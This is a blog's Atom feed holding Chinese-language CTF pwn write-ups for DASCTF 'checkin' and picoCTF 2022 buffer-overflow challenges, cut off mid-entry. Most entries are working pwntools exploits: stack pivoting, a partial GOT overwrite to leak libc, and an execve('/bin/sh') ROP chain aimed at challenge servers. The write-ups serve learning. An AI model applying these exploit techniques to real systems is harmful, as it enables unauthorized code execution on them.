<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="zh-CN"><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="zh-CN" /><updated>2022-03-27T17:23:55+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">dayfly の note</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><author><name>huyinhao</name></author><entry><title type="html">2022DASCTF X SU checkin</title><link href="http://localhost:4000/pwn/2022/03/27/2022DASCTF-X-SU-checkin.html" rel="alternate" type="text/html" title="2022DASCTF X SU checkin" /><published>2022-03-27T00:00:00+08:00</published><updated>2022-03-27T00:00:00+08:00</updated><id>http://localhost:4000/pwn/2022/03/27/2022DASCTF-X-SU-checkin</id><content type="html" xml:base="http://localhost:4000/pwn/2022/03/27/2022DASCTF-X-SU-checkin.html"><![CDATA[<h2 id="检查程序">检查程序</h2>

<p>程序语义很简单，buf数组最多有0x10的溢出，No canary，开了NX，没有任何的输出函数</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">160</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-A0h] BYREF</span>

  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0xB0uLL</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h2 id="思路">思路</h2>
<p>因为能溢出的数据不多，自然先考虑控制rbp进行栈迁移到bss段，没有输出的函数的话，考虑将setvbuf的got地址覆盖为puts函数的地址，官方给出了对应的libc版本，是GLIBC 2.31-0ubuntu9.7，发现setvbuf和puts只有低12位不同，只需覆盖最低2个字节既可，爆破的概率是1/16。成功覆盖后打印read函数的got地址就能拿到libc地址，然后就是常规的拿shell了。
利用的关键点有两个：栈迁移到bss，覆盖setvbuf从而leak libc</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'splitw'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>

<span class="n">binary</span> <span class="o">=</span> <span class="s">'./checkin'</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./checkin'</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc.so.6'</span><span class="p">)</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>             <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">rls</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">1</span>              <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvlines</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
                <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
                <span class="k">if</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'r'</span><span class="p">:</span>
                        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'node4.buuoj.cn'</span><span class="p">,</span> <span class="mi">25751</span><span class="p">)</span>
                <span class="n">bss</span> <span class="o">=</span> <span class="mh">0x404500</span>
                <span class="n">read_start</span> <span class="o">=</span> <span class="mh">0x4011BF</span>
                <span class="n">rdi</span> <span class="o">=</span> <span class="mh">0x0401253</span>
                <span class="n">rsir15</span> <span class="o">=</span> <span class="mh">0x0401251</span>
                <span class="n">rbp</span> <span class="o">=</span> <span class="mh">0x040113d</span>
                <span class="n">leave</span> <span class="o">=</span> <span class="mh">0x4011E2</span>
                <span class="n">rdxr12</span> <span class="o">=</span> <span class="mh">0x119241</span>

                <span class="n">setvbuf_got</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'setvbuf'</span><span class="p">]</span>
                <span class="n">read</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'read'</span><span class="p">]</span>
                <span class="n">fake_puts</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'setvbuf'</span><span class="p">]</span>
                <span class="n">read_got</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'read'</span><span class="p">]</span>
                <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'setvbuf_got '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">setvbuf_got</span><span class="p">))</span>
                <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'fake_puts '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">fake_puts</span><span class="p">))</span>
                <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'read_got '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">read_got</span><span class="p">))</span>

                <span class="c1"># read payload to bss
</span>                <span class="n">pay</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'b'</span><span class="o">*</span><span class="mh">0xA0</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="o">+</span><span class="mh">0xa0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">read_start</span><span class="p">)</span>
                <span class="n">s</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
                <span class="k">print</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>

                <span class="c1"># overwrite setvbuf_got to puts_got
</span>                <span class="n">make_puts</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">rsir15</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">setvbuf_got</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">read</span><span class="p">)</span>
                <span class="c1"># puts_got read_got
</span>                <span class="n">leak_read</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">read_got</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">fake_puts</span><span class="p">)</span> <span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">rbp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="o">+</span><span class="mh">0xa0</span><span class="o">+</span><span class="mh">0x100</span><span class="p">)</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">read_start</span><span class="p">)</span>
                <span class="n">exp</span> <span class="o">=</span> <span class="n">make_puts</span> 
                <span class="n">exp</span> <span class="o">+=</span> <span class="n">leak_read</span>
                <span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">exp</span><span class="p">)))</span>

                <span class="c1"># stack pivoting to bss
</span>                <span class="n">pay2</span> <span class="o">=</span> <span class="n">exp</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xa0</span><span class="p">,</span> <span class="sa">b</span><span class="s">'b'</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">leave</span><span class="p">)</span>
                <span class="n">s</span><span class="p">(</span><span class="n">pay2</span><span class="p">)</span>
                <span class="k">print</span><span class="p">(</span><span class="n">pay2</span><span class="p">)</span>

                <span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
                <span class="c1"># try to overwrite setvbuf_got[16:0]
</span>                <span class="n">s</span><span class="p">(</span><span class="n">p16</span><span class="p">(</span><span class="mh">0x4450</span><span class="p">))</span>

                <span class="c1"># leak libc
</span>                <span class="n">libc_base</span> <span class="o">=</span> <span class="n">uu64</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="s">'</span><span class="se">\x7f</span><span class="s">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:])</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'read'</span><span class="p">]</span>
                <span class="n">binsh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/sh'</span><span class="p">))</span>
                <span class="n">execve</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0xE31A0</span>
                <span class="n">pop_rdx_r12_ret</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">rdxr12</span>

                <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'libc_base '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
                <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'binsh '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">binsh</span><span class="p">))</span>
                <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'execve '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">execve</span><span class="p">))</span>

                <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

                <span class="c1"># execve(rdi='binsh', rsi=0, rdx=0)
</span>                <span class="n">exp2</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">rsir15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx_r12_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">execve</span><span class="p">)</span>
                <span class="n">pay3</span> <span class="o">=</span> <span class="n">exp2</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xa0</span><span class="p">,</span> <span class="sa">b</span><span class="s">'b'</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="o">+</span><span class="mh">0x100</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">leave</span><span class="p">)</span>
                <span class="n">s</span><span class="p">(</span><span class="n">pay3</span><span class="p">)</span>
                <span class="k">print</span><span class="p">(</span><span class="n">pay3</span><span class="p">)</span>

                <span class="n">sl</span><span class="p">(</span><span class="s">'cat flag'</span><span class="p">)</span>
                <span class="n">itr</span><span class="p">()</span>

        <span class="k">except</span><span class="p">:</span>
                <span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
                <span class="k">pass</span>
</code></pre></div></div>

<h2 id="reference">Reference</h2>
<ul>
  <li>
    <p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/fancy-rop/">Stack Pivoting</a></p>

  </li>
</ul>]]></content><author><name>dayfly</name></author><category term="pwn" /><category term="pwn" /><category term="stack pivoting" /><summary type="html"><![CDATA[检查程序]]></summary></entry><entry><title type="html">Picoctf_2022 Write-Up</title><link href="http://localhost:4000/pwn/2022/03/27/Picoctf_2022-Write-Up.html" rel="alternate" type="text/html" title="Picoctf_2022 Write-Up" /><published>2022-03-27T00:00:00+08:00</published><updated>2022-03-27T00:00:00+08:00</updated><id>http://localhost:4000/pwn/2022/03/27/Picoctf_2022-Write-Up</id><content type="html" xml:base="http://localhost:4000/pwn/2022/03/27/Picoctf_2022-Write-Up.html"><![CDATA[<h2 id="basic-file-exploit">basic-file-exploit</h2>

<h3 id="思路">思路</h3>

<p>先选<code class="language-plaintext highlighter-rouge">1</code>随便写入几个数据，满足<code class="language-plaintext highlighter-rouge">inputs != 0</code>的要求</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="n">inputs</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"No data yet"</span><span class="p">);</span>
  <span class="k">continue</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>然后选<code class="language-plaintext highlighter-rouge">2</code>输入不含数字的字符串满足以下要求，即可拿到<code class="language-plaintext highlighter-rouge">flag</code></p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">((</span><span class="n">entry_number</span> <span class="o">=</span> <span class="n">strtol</span><span class="p">(</span><span class="n">entry</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">10</span><span class="p">))</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">puts</span><span class="p">(</span><span class="n">flag</span><span class="p">);</span>
  <span class="n">fseek</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">SEEK_END</span><span class="p">);</span>
  <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="题解过程">题解过程</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  Hi, welcome to my echo chamber!
  Type '1' to enter a phrase into our database
  Type '2' to echo a phrase in our database
  Type '3' to exit the program

  No data given.
  Please put in a valid number
  1
  1
  Please enter your data:
  1234
  1234
  Please enter the length of your data:
  2
  2
  Your entry number is: 1
  Write successful, would you like to do anything else?
  2
  2
  Please enter the entry number of your data:
  ewaeawe
  ewaeawe
  picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_00AAD6B3}
</code></pre></div></div>

<h2 id="buffer-overflow-0">buffer overflow 0</h2>

<h3 id="思路-1">思路</h3>

<p>No canary，直接溢出触发segmentation fault既可。</p>

<h3 id="exp">EXP</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'i386'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'splitw'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>

<span class="n">binary</span> <span class="o">=</span> <span class="s">'./vuln'</span>
<span class="k">if</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'r'</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'saturn.picoctf.net'</span><span class="p">,</span> <span class="mi">55986</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>             <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>

<span class="c1"># trigger segmentation fault
</span><span class="n">sla</span><span class="p">(</span><span class="s">'Input: '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'b'</span><span class="o">*</span><span class="mi">20</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">rl</span><span class="p">())</span>
</code></pre></div></div>

<h2 id="buffer-overflow-1">buffer overflow 1</h2>

<h3 id="思路-2">思路</h3>

<p>No canary，简单的溢出覆盖返回地址。</p>

<h3 id="exp-1">EXP</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'i386'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'splitw'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>

<span class="n">binary</span> <span class="o">=</span> <span class="s">'./vuln'</span>
<span class="k">if</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'r'</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'saturn.picoctf.net'</span><span class="p">,</span> <span class="mi">56929</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>             <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>

<span class="n">sla</span><span class="p">(</span><span class="s">'Please enter your string: </span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'b'</span><span class="o">*</span><span class="p">(</span><span class="mh">0x28</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x080491F6</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="n">rl</span><span class="p">())</span>
<span class="n">itr</span><span class="p">()</span>
</code></pre></div></div>

<h2 id="buffer-overflow-2">buffer overflow 2</h2>

<h3 id="思路-3">思路</h3>

<p>类似于 buffer overflow 1，只不过加了一个参数传递的限制。</p>

<h3 id="exp-2">EXP</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'splitw'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>

